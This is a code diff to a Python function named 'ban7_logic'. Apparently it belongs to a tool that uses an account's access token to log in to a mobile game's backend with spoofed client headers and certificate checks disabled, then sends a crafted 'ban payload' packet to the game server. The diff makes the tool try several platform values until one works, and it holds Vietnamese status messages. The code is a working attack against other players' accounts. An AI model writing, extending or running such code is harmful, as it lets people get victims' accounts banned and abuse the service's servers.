@@ -346,68 +346,81 @@ def ban7_logic(access_token, platform_manual=None):
     try:
         # Step 1: Inspect token
         open_id, platform = inspect_token(access_token)
-        platform_ = platform_manual if platform_manual else platform
-
-        # Step 2: MajorLogin
-        payload = SimpleProtobuf.create_ban_payload(open_id, access_token, platform_)
-        enc = aes_enc(payload) # Uses default AES_KEY/IV which are correct
-
-        r = requests.post(
-            "https://loginbp.ggpolarbear.com/MajorLogin",
-            headers={
-                "Host": "loginbp.ggpolarbear.com",
-                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
-                "Connection": "Keep-Alive",
-                "Content-Type": "application/octet-stream",
-                "X-GA": "v1 1",
-                "X-Unity-Version": "2018.4.11f1",
-                "ReleaseVersion": "OB53"
-            },
-            data=enc, verify=False, timeout=15
-        )
-        if not r.ok: return {"success": False, "message": f"MajorLogin HTTP {r.status_code}"}
-
-        # Step 3: Parse response
-        # Using existing major_login parsing logic but with the custom key/iv
-        tok, k, v = None, None, None
-        try:
-            from MajorLogin_res_pb2 import MajorLoginRes
-            res = MajorLoginRes()
-            dec = aes_dec(r.content, key, iv)
-            res.ParseFromString(dec if dec else r.content)
-            if res.account_jwt:
-                tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
-        except: pass
-
-        if not tok:
-            p = proto_parse(aes_dec(r.content, key, iv) or r.content)
-            tok = pget(p, 8)
-            k = pget(p, 22) or AES_KEY
-            v = pget(p, 23) or AES_IV
-
-        if not tok: return {"success": False, "message": "Parse MajorLogin failed"}
-
-        # Step 4: GetLoginData
-        # We need the online_ip and port
-        online_ip, online_port, _, _ = get_login_data(tok, open_id, access_token, platform_)
-
-        # Step 5: Build and send packet
-        # Use the specific build_login_packet but ensure timestamp/exp is handled
-        packet = build_login_packet(tok, k, v)
         
-        recv_len = send_packet_tcp(online_ip, online_port, packet)
+        # Determine platforms to try (detect/search like spam log)
+        platforms = [int(platform_manual)] if platform_manual else list(dict.fromkeys([platform, 2, 3, 4, 6, 8]))
         
-        if recv_len > 0:
-            pl = decode_jwt(tok)
-            return {
-                "success": True,
-                "account_id": pl.get("account_id"),
-                "nickname": pl.get("nickname"),
-                "platform": platform_,
-                "msg": "Đã gửi packet thành công!"
-            }
-        else:
-            return {"success": False, "message": "Không nhận được phản hồi từ server"}
+        last_error = "Tất cả platform đều thất bại"
+        
+        for pt in platforms:
+            try:
+                # Step 2: MajorLogin
+                payload = SimpleProtobuf.create_ban_payload(open_id, access_token, pt)
+                enc = aes_enc(payload)
+
+                r = requests.post(
+                    "https://loginbp.ggpolarbear.com/MajorLogin",
+                    headers={
+                        "Host": "loginbp.ggpolarbear.com",
+                        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
+                        "Connection": "Keep-Alive",
+                        "Content-Type": "application/octet-stream",
+                        "X-GA": "v1 1",
+                        "X-Unity-Version": "2018.4.11f1",
+                        "ReleaseVersion": "OB53"
+                    },
+                    data=enc, verify=False, timeout=12
+                )
+                if not r.ok: 
+                    last_error = f"Platform {pt}: MajorLogin HTTP {r.status_code}"
+                    continue
+
+                # Step 3: Parse response
+                tok, k, v = None, None, None
+                try:
+                    from MajorLogin_res_pb2 import MajorLoginRes
+                    res = MajorLoginRes()
+                    dec = aes_dec(r.content) # Use default key/iv
+                    res.ParseFromString(dec if dec else r.content)
+                    if res.account_jwt:
+                        tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
+                except: pass
+
+                if not tok:
+                    p = proto_parse(aes_dec(r.content) or r.content)
+                    tok = pget(p, 8)
+                    k = pget(p, 22) or AES_KEY
+                    v = pget(p, 23) or AES_IV
+
+                if not tok: 
+                    last_error = f"Platform {pt}: Parse failed"
+                    continue
+
+                # Step 4: GetLoginData
+                online_ip, online_port, _, _ = get_login_data(tok, open_id, access_token, pt)
+
+                # Step 5: Build and send packet
+                packet = build_login_packet(tok, k, v)
+                recv_len = send_packet_tcp(online_ip, online_port, packet)
+                
+                if recv_len > 0:
+                    pl = decode_jwt(tok)
+                    return {
+                        "success": True,
+                        "account_id": pl.get("account_id"),
+                        "nickname": pl.get("nickname"),
+                        "platform": pt,
+                        "msg": "Đã gửi packet thành công!"
+                    }
+                else:
+                    last_error = f"Platform {pt}: Không nhận được phản hồi"
+                    continue
+
+            except Exception as e:
+                last_error = f"Platform {pt}: {str(e)}"
+                continue
+                
+        return {"success": False, "message": last_error}
 
     except Exception as e:
         return {"success": False, "message": str(e)}
